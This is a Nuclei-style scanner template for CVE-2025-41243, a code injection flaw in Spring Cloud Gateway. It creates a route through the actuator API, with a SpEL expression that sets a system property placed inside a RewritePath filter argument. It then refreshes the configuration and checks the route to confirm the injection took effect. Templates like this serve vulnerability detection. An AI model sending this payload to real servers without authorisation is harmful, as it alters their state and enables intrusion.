id: SpringCloud-CVE-2025-41243-CodeInjection
info:
  name: SpringCloud-CVE-2025-41243-CodeInjection
  author: iSee857
  severity: critical
  description: |
    SpringCloud-CVE-2025-41243-CodeInjection.

variables:
  test_123: "{{rand_text_alphanumeric(8)}}"
  test33: "{{rand_text_alphanumeric(6)}}"

http:
  - id: create-route
    raw:
      - |
        POST /actuator/gateway/routes/{{test_123}} HTTP/1.1
        Host: {{Hostname}}
        Content-type: application/json

        {
          "predicates": [
              {
                  "name": "Path",
                  "args": {
                      "_genkey_0": "/actuators/{{test33}}"
                  }
              }
          ],
          "filters": [
              {
                  "name": "RewritePath",
                  "args": {
                      "_genkey_0": "/{{test33}}",
                      "_genkey_1": " #{ @systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = true}"
                  }
              }
          ],
          "uri": "http://example.com",
          "order": -1
        }
    matchers:
      - type: status
        status:
          - 201

  - id: refresh-config
    method: POST
    path:
      - "{{BaseURL}}/actuator/gateway/refresh"
    matchers:
      - type: status
        status:
          - 200

  - id: check-route
    method: GET
    path:
      - "{{BaseURL}}/actuator/gateway/routes/{{test_123}}"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "/actuators/{{test33}}"
          - "{{test33}} = ' true'"
        condition: and